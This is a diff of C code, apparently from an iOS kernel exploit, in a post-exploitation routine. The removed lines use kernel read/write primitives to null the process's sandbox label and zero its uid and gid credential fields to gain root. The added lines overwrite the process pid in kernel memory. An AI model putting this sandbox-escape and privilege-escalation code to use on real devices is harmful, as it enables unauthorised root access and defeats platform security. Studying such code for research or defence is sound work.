@@ -34,37 +34,10 @@ void postExploit(void) {
         return;
     }
     printf("proc: 0x%llx\n", proc);
-    uint64_t ucred = kread64(proc + off_p_ucred);
-    printf("ucred: 0x%llx\n", ucred);
-    uint64_t label = kread64(ucred + off_u_cr_label);
-    printf("label: 0x%llx\n", label);
-    printf("uid: %u\n", kread32(ucred + off_u_cr_uid));
-    printf("sandbox addr: 0x%llx\n", label + 0x10);
-    printf("sandbox: %llx\n", kread64(label + 0x10));
-    printf("sandbox: %u\n", kread32(label + 0x10));
-    //Escape Sandbox
-    //kwrite64(label + 0x10, 0);
-    
-    uint64_t _buf[1] = {};
-    _buf[0] = 0x0;
-    kwrite(_kfd, &_buf, label + 0x10, sizeof(uint64_t));
-    
-    printf("sandbox: %llx\n", kread64(label + 0x10));
-    printf("sandbox: %u\n", kread32(label + 0x10));
-    //Get Root
-    kwrite32(proc + off_p_uid, 0);
-    kwrite32(proc + off_p_ruid, 0);
-    kwrite32(proc + off_p_gid, 0);
-    kwrite32(proc + off_p_rgid, 0);
-    kwrite32(ucred + off_u_cr_uid, 0);
-    kwrite32(ucred + off_u_cr_ruid, 0);
-    kwrite32(ucred + off_u_cr_svuid, 0);
-    kwrite32(ucred + off_u_cr_ngroups, 1);
-    kwrite32(ucred + off_u_cr_groups, 0);
-    kwrite32(ucred + off_u_cr_rgid, 0);
-    kwrite32(ucred + off_u_cr_svgid, 0);
-    printf("Done! 6\n");
-    printf("uid: %u\n", kread32(ucred + off_u_cr_uid));
+    printf("pid: 0x%u\n", kread32(proc + off_p_pid));
+    kwrite32(proc + off_p_pid, 200);
+    printf("pid: 0x%u\n", kread32(proc + off_p_pid));
+    printf("Done! 7\n");
 }
 
 uint64_t getProc(pid_t pid) {
